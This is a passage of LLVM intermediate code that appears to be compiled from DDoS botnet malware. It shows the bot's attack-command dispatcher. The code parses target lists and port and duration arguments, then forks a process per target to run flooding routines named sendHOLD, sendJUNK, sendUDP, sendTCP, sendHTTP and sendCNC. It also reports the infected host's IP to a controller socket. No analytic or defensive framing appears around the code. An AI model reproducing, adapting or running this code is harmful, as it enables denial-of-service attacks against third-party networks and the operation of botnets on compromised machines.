  %97 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %98 = call i8* @inet_ntoa(i32 %97) #2
  %99 = call i32 (i32, i8*, ...) @sockprintf(i32 %96, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.117, i32 0, i32 0), i8* %98)
  br label %728

; <label>:100:                                    ; preds = %89
  %101 = load i8**, i8*** %4, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 0
  %103 = load i8*, i8** %102, align 8
  %104 = call i32 @strcmp(i8* %103, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.118, i32 0, i32 0)) #10
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %162, label %106

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* %3, align 4
  %108 = icmp slt i32 %107, 4
  br i1 %108, label %121, label %109

; <label>:109:                                    ; preds = %106
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 2
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @atoi(i8* %112) #10
  %114 = icmp slt i32 %113, 1
  br i1 %114, label %121, label %115

; <label>:115:                                    ; preds = %109
  %116 = load i8**, i8*** %4, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 3
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 @atoi(i8* %118) #10
  %120 = icmp slt i32 %119, 1
  br i1 %120, label %121, label %122

; <label>:121:                                    ; preds = %115, %109, %106
  br label %728

; <label>:122:                                    ; preds = %115
  %123 = load i8**, i8*** %4, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 1
  %125 = load i8*, i8** %124, align 8
  store i8* %125, i8** %5, align 8
  %126 = load i8**, i8*** %4, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 2
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 @atoi(i8* %128) #10
  store i32 %129, i32* %6, align 4
  %130 = load i8**, i8*** %4, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 3
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @atoi(i8* %132) #10
  store i32 %133, i32* %7, align 4
  %134 = load i8*, i8** %5, align 8
  %135 = call i8* @strstr(i8* %134, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %136 = icmp ne i8* %135, null
  br i1 %136, label %137, label %153

; <label>:137:                                    ; preds = %122
  %138 = load i8*, i8** %5, align 8
  %139 = call i8* @strtok(i8* %138, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %139, i8** %8, align 8
  br label %140

; <label>:140:                                    ; preds = %150, %137
  %141 = load i8*, i8** %8, align 8
  %142 = icmp ne i8* %141, null
  br i1 %142, label %143, label %152

; <label>:143:                                    ; preds = %140
  %144 = call i32 @listFork()
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %150, label %146

; <label>:146:                                    ; preds = %143
  %147 = load i8*, i8** %8, align 8
  %148 = load i32, i32* %6, align 4
  %149 = load i32, i32* %7, align 4
  call void @sendHOLD(i8* %147, i32 %148, i32 %149)
  call void @_exit(i32 0) #12
  unreachable

; <label>:150:                                    ; preds = %143
  %151 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %151, i8** %8, align 8
  br label %140

; <label>:152:                                    ; preds = %140
  br label %161

; <label>:153:                                    ; preds = %122
  %154 = call i32 @listFork()
  %155 = icmp ne i32 %154, 0
  br i1 %155, label %156, label %157

; <label>:156:                                    ; preds = %153
  br label %728

; <label>:157:                                    ; preds = %153
  %158 = load i8*, i8** %5, align 8
  %159 = load i32, i32* %6, align 4
  %160 = load i32, i32* %7, align 4
  call void @sendHOLD(i8* %158, i32 %159, i32 %160)
  call void @_exit(i32 0) #12
  unreachable

; <label>:161:                                    ; preds = %152
  br label %728

; <label>:162:                                    ; preds = %100
  %163 = load i8**, i8*** %4, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 0
  %165 = load i8*, i8** %164, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.119, i32 0, i32 0)) #10
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %226, label %168

; <label>:168:                                    ; preds = %162
  %169 = load i32, i32* %3, align 4
  %170 = icmp slt i32 %169, 4
  br i1 %170, label %183, label %171

; <label>:171:                                    ; preds = %168
  %172 = load i8**, i8*** %4, align 8
  %173 = getelementptr inbounds i8*, i8** %172, i64 2
  %174 = load i8*, i8** %173, align 8
  %175 = call i32 @atoi(i8* %174) #10
  %176 = icmp slt i32 %175, 1
  br i1 %176, label %183, label %177

; <label>:177:                                    ; preds = %171
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 3
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @atoi(i8* %180) #10
  %182 = icmp slt i32 %181, 1
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %177, %171, %168
  br label %728

; <label>:184:                                    ; preds = %177
  %185 = load i8**, i8*** %4, align 8
  %186 = getelementptr inbounds i8*, i8** %185, i64 1
  %187 = load i8*, i8** %186, align 8
  store i8* %187, i8** %9, align 8
  %188 = load i8**, i8*** %4, align 8
  %189 = getelementptr inbounds i8*, i8** %188, i64 2
  %190 = load i8*, i8** %189, align 8
  %191 = call i32 @atoi(i8* %190) #10
  store i32 %191, i32* %10, align 4
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 3
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #10
  store i32 %195, i32* %11, align 4
  %196 = load i8*, i8** %9, align 8
  %197 = call i8* @strstr(i8* %196, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %198 = icmp ne i8* %197, null
  br i1 %198, label %199, label %217

; <label>:199:                                    ; preds = %184
  %200 = load i8*, i8** %9, align 8
  %201 = call i8* @strtok(i8* %200, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %201, i8** %12, align 8
  br label %202

; <label>:202:                                    ; preds = %214, %199
  %203 = load i8*, i8** %12, align 8
  %204 = icmp ne i8* %203, null
  br i1 %204, label %205, label %216

; <label>:205:                                    ; preds = %202
  %206 = call i32 @listFork()
  %207 = icmp ne i32 %206, 0
  br i1 %207, label %214, label %208

; <label>:208:                                    ; preds = %205
  %209 = load i8*, i8** %12, align 8
  %210 = load i32, i32* %10, align 4
  %211 = load i32, i32* %11, align 4
  call void @sendJUNK(i8* %209, i32 %210, i32 %211)
  %212 = load i32, i32* @mainCommSock, align 4
  %213 = call i32 @close(i32 %212)
  call void @_exit(i32 0) #12
  unreachable

; <label>:214:                                    ; preds = %205
  %215 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %215, i8** %12, align 8
  br label %202

; <label>:216:                                    ; preds = %202
  br label %225

; <label>:217:                                    ; preds = %184
  %218 = call i32 @listFork()
  %219 = icmp ne i32 %218, 0
  br i1 %219, label %220, label %221

; <label>:220:                                    ; preds = %217
  br label %728

; <label>:221:                                    ; preds = %217
  %222 = load i8*, i8** %9, align 8
  %223 = load i32, i32* %10, align 4
  %224 = load i32, i32* %11, align 4
  call void @sendJUNK(i8* %222, i32 %223, i32 %224)
  call void @_exit(i32 0) #12
  unreachable

; <label>:225:                                    ; preds = %216
  br label %728

; <label>:226:                                    ; preds = %162
  %227 = load i8**, i8*** %4, align 8
  %228 = getelementptr inbounds i8*, i8** %227, i64 0
  %229 = load i8*, i8** %228, align 8
  %230 = call i32 @strcmp(i8* %229, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.120, i32 0, i32 0)) #10
  %231 = icmp ne i32 %230, 0
  br i1 %231, label %375, label %232

; <label>:232:                                    ; preds = %226
  %233 = load i32, i32* %3, align 4
  %234 = icmp slt i32 %233, 6
  br i1 %234, label %286, label %235

; <label>:235:                                    ; preds = %232
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 3
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #10
  %240 = icmp eq i32 %239, -1
  br i1 %240, label %286, label %241

; <label>:241:                                    ; preds = %235
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 2
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #10
  %246 = icmp eq i32 %245, -1
  br i1 %246, label %286, label %247

; <label>:247:                                    ; preds = %241
  %248 = load i8**, i8*** %4, align 8
  %249 = getelementptr inbounds i8*, i8** %248, i64 4
  %250 = load i8*, i8** %249, align 8
  %251 = call i32 @atoi(i8* %250) #10
  %252 = icmp eq i32 %251, -1
  br i1 %252, label %286, label %253

; <label>:253:                                    ; preds = %247
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 5
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @atoi(i8* %256) #10
  %258 = icmp eq i32 %257, -1
  br i1 %258, label %286, label %259

; <label>:259:                                    ; preds = %253
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 5
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #10
  %264 = icmp sgt i32 %263, 65536
  br i1 %264, label %286, label %265

; <label>:265:                                    ; preds = %259
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds i8*, i8** %266, i64 5
  %268 = load i8*, i8** %267, align 8
  %269 = call i32 @atoi(i8* %268) #10
  %270 = icmp sgt i32 %269, 65500
  br i1 %270, label %286, label %271

; <label>:271:                                    ; preds = %265
  %272 = load i8**, i8*** %4, align 8
  %273 = getelementptr inbounds i8*, i8** %272, i64 4
  %274 = load i8*, i8** %273, align 8
  %275 = call i32 @atoi(i8* %274) #10
  %276 = icmp sgt i32 %275, 32
  br i1 %276, label %286, label %277

; <label>:277:                                    ; preds = %271
  %278 = load i32, i32* %3, align 4
  %279 = icmp eq i32 %278, 7
  br i1 %279, label %280, label %287

; <label>:280:                                    ; preds = %277
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 6
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 @atoi(i8* %283) #10
  %285 = icmp slt i32 %284, 1
  br i1 %285, label %286, label %287

; <label>:286:                                    ; preds = %280, %271, %265, %259, %253, %247, %241, %235, %232
  br label %728

; <label>:287:                                    ; preds = %280, %277
  %288 = load i8**, i8*** %4, align 8
  %289 = getelementptr inbounds i8*, i8** %288, i64 1
  %290 = load i8*, i8** %289, align 8
  store i8* %290, i8** %13, align 8
  %291 = load i8**, i8*** %4, align 8
  %292 = getelementptr inbounds i8*, i8** %291, i64 2
  %293 = load i8*, i8** %292, align 8
  %294 = call i32 @atoi(i8* %293) #10
  store i32 %294, i32* %14, align 4
  %295 = load i8**, i8*** %4, align 8
  %296 = getelementptr inbounds i8*, i8** %295, i64 3
  %297 = load i8*, i8** %296, align 8
  %298 = call i32 @atoi(i8* %297) #10
  store i32 %298, i32* %15, align 4
  %299 = load i8**, i8*** %4, align 8
  %300 = getelementptr inbounds i8*, i8** %299, i64 4
  %301 = load i8*, i8** %300, align 8
  %302 = call i32 @atoi(i8* %301) #10
  store i32 %302, i32* %16, align 4
  %303 = load i8**, i8*** %4, align 8
  %304 = getelementptr inbounds i8*, i8** %303, i64 5
  %305 = load i8*, i8** %304, align 8
  %306 = call i32 @atoi(i8* %305) #10
  store i32 %306, i32* %17, align 4
  %307 = load i32, i32* %3, align 4
  %308 = icmp sgt i32 %307, 6
  br i1 %308, label %309, label %314

; <label>:309:                                    ; preds = %287
  %310 = load i8**, i8*** %4, align 8
  %311 = getelementptr inbounds i8*, i8** %310, i64 6
  %312 = load i8*, i8** %311, align 8
  %313 = call i32 @atoi(i8* %312) #10
  br label %315

; <label>:314:                                    ; preds = %287
  br label %315

; <label>:315:                                    ; preds = %314, %309
  %316 = phi i32 [ %313, %309 ], [ 1000, %314 ]
  store i32 %316, i32* %18, align 4
  %317 = load i32, i32* %3, align 4
  %318 = icmp sgt i32 %317, 7
  br i1 %318, label %319, label %324

; <label>:319:                                    ; preds = %315
  %320 = load i8**, i8*** %4, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 7
  %322 = load i8*, i8** %321, align 8
  %323 = call i32 @atoi(i8* %322) #10
  br label %325

; <label>:324:                                    ; preds = %315
  br label %325

; <label>:325:                                    ; preds = %324, %319
  %326 = phi i32 [ %323, %319 ], [ 1000000, %324 ]
  store i32 %326, i32* %19, align 4
  %327 = load i32, i32* %3, align 4
  %328 = icmp sgt i32 %327, 8
  br i1 %328, label %329, label %334

; <label>:329:                                    ; preds = %325
  %330 = load i8**, i8*** %4, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 8
  %332 = load i8*, i8** %331, align 8
  %333 = call i32 @atoi(i8* %332) #10
  br label %335

; <label>:334:                                    ; preds = %325
  br label %335

; <label>:335:                                    ; preds = %334, %329
  %336 = phi i32 [ %333, %329 ], [ 0, %334 ]
  store i32 %336, i32* %20, align 4
  %337 = load i8*, i8** %13, align 8
  %338 = call i8* @strstr(i8* %337, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %339 = icmp ne i8* %338, null
  br i1 %339, label %340, label %361

; <label>:340:                                    ; preds = %335
  %341 = load i8*, i8** %13, align 8
  %342 = call i8* @strtok(i8* %341, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %342, i8** %21, align 8
  br label %343

; <label>:343:                                    ; preds = %358, %340
  %344 = load i8*, i8** %21, align 8
  %345 = icmp ne i8* %344, null
  br i1 %345, label %346, label %360

; <label>:346:                                    ; preds = %343
  %347 = call i32 @listFork()
  %348 = icmp ne i32 %347, 0
  br i1 %348, label %358, label %349

; <label>:349:                                    ; preds = %346
  %350 = load i8*, i8** %21, align 8
  %351 = load i32, i32* %14, align 4
  %352 = load i32, i32* %15, align 4
  %353 = load i32, i32* %16, align 4
  %354 = load i32, i32* %17, align 4
  %355 = load i32, i32* %18, align 4
  %356 = load i32, i32* %19, align 4
  %357 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %350, i32 %351, i32 %352, i32 %353, i32 %354, i32 %355, i32 %356, i32 %357)
  call void @_exit(i32 0) #12
  unreachable

; <label>:358:                                    ; preds = %346
  %359 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %359, i8** %21, align 8
  br label %343

; <label>:360:                                    ; preds = %343
  br label %374

; <label>:361:                                    ; preds = %335
  %362 = call i32 @listFork()
  %363 = icmp ne i32 %362, 0
  br i1 %363, label %373, label %364

; <label>:364:                                    ; preds = %361
  %365 = load i8*, i8** %13, align 8
  %366 = load i32, i32* %14, align 4
  %367 = load i32, i32* %15, align 4
  %368 = load i32, i32* %16, align 4
  %369 = load i32, i32* %17, align 4
  %370 = load i32, i32* %18, align 4
  %371 = load i32, i32* %19, align 4
  %372 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %365, i32 %366, i32 %367, i32 %368, i32 %369, i32 %370, i32 %371, i32 %372)
  call void @_exit(i32 0) #12
  unreachable

; <label>:373:                                    ; preds = %361
  br label %374

; <label>:374:                                    ; preds = %373, %360
  br label %728

; <label>:375:                                    ; preds = %226
  %376 = load i8**, i8*** %4, align 8
  %377 = getelementptr inbounds i8*, i8** %376, i64 0
  %378 = load i8*, i8** %377, align 8
  %379 = call i32 @strcmp(i8* %378, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i32 0, i32 0)) #10
  %380 = icmp ne i32 %379, 0
  br i1 %380, label %502, label %381

; <label>:381:                                    ; preds = %375
  %382 = load i32, i32* %3, align 4
  %383 = icmp slt i32 %382, 6
  br i1 %383, label %426, label %384

; <label>:384:                                    ; preds = %381
  %385 = load i8**, i8*** %4, align 8
  %386 = getelementptr inbounds i8*, i8** %385, i64 3
  %387 = load i8*, i8** %386, align 8
  %388 = call i32 @atoi(i8* %387) #10
  %389 = icmp eq i32 %388, -1
  br i1 %389, label %426, label %390

; <label>:390:                                    ; preds = %384
  %391 = load i8**, i8*** %4, align 8
  %392 = getelementptr inbounds i8*, i8** %391, i64 2
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @atoi(i8* %393) #10
  %395 = icmp eq i32 %394, -1
  br i1 %395, label %426, label %396

; <label>:396:                                    ; preds = %390
  %397 = load i8**, i8*** %4, align 8
  %398 = getelementptr inbounds i8*, i8** %397, i64 4
  %399 = load i8*, i8** %398, align 8
  %400 = call i32 @atoi(i8* %399) #10
  %401 = icmp eq i32 %400, -1
  br i1 %401, label %426, label %402

; <label>:402:                                    ; preds = %396
  %403 = load i8**, i8*** %4, align 8
  %404 = getelementptr inbounds i8*, i8** %403, i64 4
  %405 = load i8*, i8** %404, align 8
  %406 = call i32 @atoi(i8* %405) #10
  %407 = icmp sgt i32 %406, 32
  br i1 %407, label %426, label %408

; <label>:408:                                    ; preds = %402
  %409 = load i32, i32* %3, align 4
  %410 = icmp sgt i32 %409, 6
  br i1 %410, label %411, label %417

; <label>:411:                                    ; preds = %408
  %412 = load i8**, i8*** %4, align 8
  %413 = getelementptr inbounds i8*, i8** %412, i64 6
  %414 = load i8*, i8** %413, align 8
  %415 = call i32 @atoi(i8* %414) #10
  %416 = icmp slt i32 %415, 0
  br i1 %416, label %426, label %417

; <label>:417:                                    ; preds = %411, %408
  %418 = load i32, i32* %3, align 4
  %419 = icmp eq i32 %418, 8
  br i1 %419, label %420, label %427

; <label>:420:                                    ; preds = %417
  %421 = load i8**, i8*** %4, align 8
  %422 = getelementptr inbounds i8*, i8** %421, i64 7
  %423 = load i8*, i8** %422, align 8
  %424 = call i32 @atoi(i8* %423) #10
  %425 = icmp slt i32 %424, 1
  br i1 %425, label %426, label %427

; <label>:426:                                    ; preds = %420, %411, %402, %396, %390, %384, %381
  br label %728

; <label>:427:                                    ; preds = %420, %417
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 1
  %430 = load i8*, i8** %429, align 8
  store i8* %430, i8** %22, align 8
  %431 = load i8**, i8*** %4, align 8
  %432 = getelementptr inbounds i8*, i8** %431, i64 2
  %433 = load i8*, i8** %432, align 8
  %434 = call i32 @atoi(i8* %433) #10
  store i32 %434, i32* %23, align 4
  %435 = load i8**, i8*** %4, align 8
  %436 = getelementptr inbounds i8*, i8** %435, i64 3
  %437 = load i8*, i8** %436, align 8
  %438 = call i32 @atoi(i8* %437) #10
  store i32 %438, i32* %24, align 4
  %439 = load i8**, i8*** %4, align 8
  %440 = getelementptr inbounds i8*, i8** %439, i64 4
  %441 = load i8*, i8** %440, align 8
  %442 = call i32 @atoi(i8* %441) #10
  store i32 %442, i32* %25, align 4
  %443 = load i8**, i8*** %4, align 8
  %444 = getelementptr inbounds i8*, i8** %443, i64 5
  %445 = load i8*, i8** %444, align 8
  store i8* %445, i8** %26, align 8
  %446 = load i32, i32* %3, align 4
  %447 = icmp eq i32 %446, 8
  br i1 %447, label %448, label %453

; <label>:448:                                    ; preds = %427
  %449 = load i8**, i8*** %4, align 8
  %450 = getelementptr inbounds i8*, i8** %449, i64 7
  %451 = load i8*, i8** %450, align 8
  %452 = call i32 @atoi(i8* %451) #10
  br label %454

; <label>:453:                                    ; preds = %427
  br label %454

; <label>:454:                                    ; preds = %453, %448
  %455 = phi i32 [ %452, %448 ], [ 10, %453 ]
  store i32 %455, i32* %27, align 4
  %456 = load i32, i32* %3, align 4
  %457 = icmp sgt i32 %456, 6
  br i1 %457, label %458, label %463

; <label>:458:                                    ; preds = %454
  %459 = load i8**, i8*** %4, align 8
  %460 = getelementptr inbounds i8*, i8** %459, i64 6
  %461 = load i8*, i8** %460, align 8
  %462 = call i32 @atoi(i8* %461) #10
  br label %464

; <label>:463:                                    ; preds = %454
  br label %464

; <label>:464:                                    ; preds = %463, %458
  %465 = phi i32 [ %462, %458 ], [ 0, %463 ]
  store i32 %465, i32* %28, align 4
  %466 = load i8*, i8** %22, align 8
  %467 = call i8* @strstr(i8* %466, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %468 = icmp ne i8* %467, null
  br i1 %468, label %469, label %489

; <label>:469:                                    ; preds = %464
  %470 = load i8*, i8** %22, align 8
  %471 = call i8* @strtok(i8* %470, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %471, i8** %29, align 8
  br label %472

; <label>:472:                                    ; preds = %486, %469
  %473 = load i8*, i8** %29, align 8
  %474 = icmp ne i8* %473, null
  br i1 %474, label %475, label %488

; <label>:475:                                    ; preds = %472
  %476 = call i32 @listFork()
  %477 = icmp ne i32 %476, 0
  br i1 %477, label %486, label %478

; <label>:478:                                    ; preds = %475
  %479 = load i8*, i8** %29, align 8
  %480 = load i32, i32* %23, align 4
  %481 = load i32, i32* %24, align 4
  %482 = load i32, i32* %25, align 4
  %483 = load i8*, i8** %26, align 8
  %484 = load i32, i32* %28, align 4
  %485 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %479, i32 %480, i32 %481, i32 %482, i8* %483, i32 %484, i32 %485)
  call void @_exit(i32 0) #12
  unreachable

; <label>:486:                                    ; preds = %475
  %487 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %487, i8** %29, align 8
  br label %472

; <label>:488:                                    ; preds = %472
  br label %501

; <label>:489:                                    ; preds = %464
  %490 = call i32 @listFork()
  %491 = icmp ne i32 %490, 0
  br i1 %491, label %500, label %492

; <label>:492:                                    ; preds = %489
  %493 = load i8*, i8** %22, align 8
  %494 = load i32, i32* %23, align 4
  %495 = load i32, i32* %24, align 4
  %496 = load i32, i32* %25, align 4
  %497 = load i8*, i8** %26, align 8
  %498 = load i32, i32* %28, align 4
  %499 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %493, i32 %494, i32 %495, i32 %496, i8* %497, i32 %498, i32 %499)
  call void @_exit(i32 0) #12
  unreachable

; <label>:500:                                    ; preds = %489
  br label %501

; <label>:501:                                    ; preds = %500, %488
  br label %728

; <label>:502:                                    ; preds = %375
  %503 = load i8**, i8*** %4, align 8
  %504 = getelementptr inbounds i8*, i8** %503, i64 0
  %505 = load i8*, i8** %504, align 8
  %506 = call i32 @strcmp(i8* %505, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.122, i32 0, i32 0)) #10
  %507 = icmp ne i32 %506, 0
  br i1 %507, label %556, label %508

; <label>:508:                                    ; preds = %502
  %509 = load i32, i32* %3, align 4
  %510 = icmp slt i32 %509, 4
  br i1 %510, label %523, label %511

; <label>:511:                                    ; preds = %508
  %512 = load i8**, i8*** %4, align 8
  %513 = getelementptr inbounds i8*, i8** %512, i64 2
  %514 = load i8*, i8** %513, align 8
  %515 = call i32 @atoi(i8* %514) #10
  %516 = icmp slt i32 %515, 1
  br i1 %516, label %523, label %517

; <label>:517:                                    ; preds = %511
  %518 = load i8**, i8*** %4, align 8
  %519 = getelementptr inbounds i8*, i8** %518, i64 3
  %520 = load i8*, i8** %519, align 8
  %521 = call i32 @atoi(i8* %520) #10
  %522 = icmp slt i32 %521, 1
  br i1 %522, label %523, label %524

; <label>:523:                                    ; preds = %517, %511, %508
  br label %728

; <label>:524:                                    ; preds = %517
  %525 = load i8**, i8*** %4, align 8
  %526 = getelementptr inbounds i8*, i8** %525, i64 1
  %527 = load i8*, i8** %526, align 8
  store i8* %527, i8** %30, align 8
  %528 = load i8**, i8*** %4, align 8
  %529 = getelementptr inbounds i8*, i8** %528, i64 2
  %530 = load i8*, i8** %529, align 8
  %531 = call i32 @atoi(i8* %530) #10
  store i32 %531, i32* %31, align 4
  %532 = load i8**, i8*** %4, align 8
  %533 = getelementptr inbounds i8*, i8** %532, i64 3
  %534 = load i8*, i8** %533, align 8
  %535 = call i32 @atoi(i8* %534) #10
  store i32 %535, i32* %32, align 4
  %536 = load i8*, i8** %30, align 8
  %537 = call i8* @strstr(i8* %536, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %538 = icmp ne i8* %537, null
  br i1 %538, label %539, label %551

; <label>:539:                                    ; preds = %524
  %540 = load i8*, i8** %30, align 8
  %541 = call i8* @strtok(i8* %540, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %541, i8** %33, align 8
  br label %542

; <label>:542:                                    ; preds = %545, %539
  %543 = load i8*, i8** %33, align 8
  %544 = icmp ne i8* %543, null
  br i1 %544, label %545, label %550

; <label>:545:                                    ; preds = %542
  %546 = load i8*, i8** %33, align 8
  %547 = load i32, i32* %31, align 4
  %548 = load i32, i32* %32, align 4
  call void @sendHTTP(i8* %546, i32 %547, i32 %548)
  %549 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %549, i8** %33, align 8
  br label %542

; <label>:550:                                    ; preds = %542
  br label %555

; <label>:551:                                    ; preds = %524
  %552 = load i8*, i8** %30, align 8
  %553 = load i32, i32* %31, align 4
  %554 = load i32, i32* %32, align 4
  call void @sendHTTP(i8* %552, i32 %553, i32 %554)
  br label %555

; <label>:555:                                    ; preds = %551, %550
  br label %728

; <label>:556:                                    ; preds = %502
  %557 = load i8**, i8*** %4, align 8
  %558 = getelementptr inbounds i8*, i8** %557, i64 0
  %559 = load i8*, i8** %558, align 8
  %560 = call i32 @strcmp(i8* %559, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.123, i32 0, i32 0)) #10
  %561 = icmp ne i32 %560, 0
  br i1 %561, label %620, label %562

; <label>:562:                                    ; preds = %556
  %563 = load i32, i32* %3, align 4
  %564 = icmp slt i32 %563, 4
  br i1 %564, label %577, label %565

; <label>:565:                                    ; preds = %562
  %566 = load i8**, i8*** %4, align 8
  %567 = getelementptr inbounds i8*, i8** %566, i64 2
  %568 = load i8*, i8** %567, align 8
  %569 = call i32 @atoi(i8* %568) #10
  %570 = icmp slt i32 %569, 1
  br i1 %570, label %577, label %571

; <label>:571:                                    ; preds = %565
  %572 = load i8**, i8*** %4, align 8
  %573 = getelementptr inbounds i8*, i8** %572, i64 3
  %574 = load i8*, i8** %573, align 8
  %575 = call i32 @atoi(i8* %574) #10
  %576 = icmp slt i32 %575, 1
  br i1 %576, label %577, label %578

; <label>:577:                                    ; preds = %571, %565, %562
  br label %728

; <label>:578:                                    ; preds = %571
  %579 = load i8**, i8*** %4, align 8
  %580 = getelementptr inbounds i8*, i8** %579, i64 1
  %581 = load i8*, i8** %580, align 8
  store i8* %581, i8** %34, align 8
  %582 = load i8**, i8*** %4, align 8
  %583 = getelementptr inbounds i8*, i8** %582, i64 2
  %584 = load i8*, i8** %583, align 8
  %585 = call i32 @atoi(i8* %584) #10
  store i32 %585, i32* %35, align 4
  %586 = load i8**, i8*** %4, align 8
  %587 = getelementptr inbounds i8*, i8** %586, i64 3
  %588 = load i8*, i8** %587, align 8
  %589 = call i32 @atoi(i8* %588) #10
  store i32 %589, i32* %36, align 4
  %590 = load i8*, i8** %34, align 8
  %591 = call i8* @strstr(i8* %590, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %592 = icmp ne i8* %591, null
  br i1 %592, label %593, label %611

; <label>:593:                                    ; preds = %578
  %594 = load i8*, i8** %34, align 8
  %595 = call i8* @strtok(i8* %594, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %595, i8** %37, align 8
  br label %596

; <label>:596:                                    ; preds = %608, %593
  %597 = load i8*, i8** %37, align 8
  %598 = icmp ne i8* %597, null
  br i1 %598, label %599, label %610

; <label>:599:                                    ; preds = %596
  %600 = call i32 @listFork()
  %601 = icmp ne i32 %600, 0
  br i1 %601, label %608, label %602

; <label>:602:                                    ; preds = %599
  %603 = load i8*, i8** %37, align 8
  %604 = load i32, i32* %35, align 4
  %605 = load i32, i32* %36, align 4
  call void @sendCNC(i8* %603, i32 %604, i32 %605)
  %606 = load i32, i32* @mainCommSock, align 4
  %607 = call i32 @close(i32 %606)
  call void @_exit(i32 0) #12
  unreachable

; <label>:608:                                    ; preds = %599
  %609 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %609, i8** %37, align 8
  br label %596

; <label>:610:                                    ; preds = %596
  br label %619

; <label>:611:                                    ; preds = %578
  %612 = call i32 @listFork()
  %613 = icmp ne i32 %612, 0
  br i1 %613, label %614, label %615

; <label>:614:                                    ; preds = %611
  br label %728

; <label>:615:                                    ; preds = %611
  %616 = load i8*, i8** %34, align 8
  %617 = load i32, i32* %35, align 4
  %618 = load i32, i32* %36, align 4
  call void @sendCNC(i8* %616, i32 %617, i32 %618)
  call void @_exit(i32 0) #12
  unreachable

; <label>:619:                                    ; preds = %610
  br label %728

; <label>:620:                                    ; preds = %556
  %621 = load i8**, i8*** %4, align 8
  %622 = getelementptr inbounds i8*, i8** %621, i64 0
  %623 = load i8*, i8** %622, align 8
